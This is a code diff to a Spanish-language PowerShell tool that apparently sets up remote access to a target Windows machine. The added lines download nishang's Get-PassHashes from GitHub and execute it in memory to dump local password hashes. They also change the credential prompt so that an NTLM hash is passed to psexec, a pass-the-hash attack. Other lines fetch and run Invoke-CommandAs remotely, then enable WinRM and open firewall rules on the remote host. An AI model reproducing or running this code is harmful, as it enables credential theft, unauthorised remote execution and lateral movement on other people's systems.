@@ -65,15 +65,19 @@ function ConvertFrom-SecureToPlain {
         Write-Host ""
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
+        if($hash -eq 'Si') { 
+        Write-Host "Recuperando hashes locales.." -ForegroundColor Magenta
+        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1" | iex 2> $null
+        Get-PassHashes
+        Write-Host ""}
         $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
         Write-Host ""
         $user = Read-Host -Prompt 'Y el usuario?'
         Write-Host ""
-        $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
+        $password = Read-Host -AsSecureString -Prompt 'Escribe el hash NTLM'
         $PlainTextPassword = ConvertFrom-SecureToPlain $password
         Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
-        Invoke-WebRequest -Uri "https://live.sysinternals.com/psexec.exe" -OutFile "psexec.exe" -UseBasicParsing
         .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "winrm quickconfig -quiet ; Enable-PSRemoting -Force ; Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private" -accepteula
         .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -accepteula
         .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -accepteula
@@ -102,9 +106,9 @@ function ConvertFrom-SecureToPlain {
         $user = Read-Host -Prompt 'Y el usuario?'
         Write-Host ""
         $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
+        $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
         Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
-	$credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 	(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs.psm1") | iex
         Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "winrm quickconfig -quiet ; Enable-PSRemoting -Force ; Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private" }
         Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" }
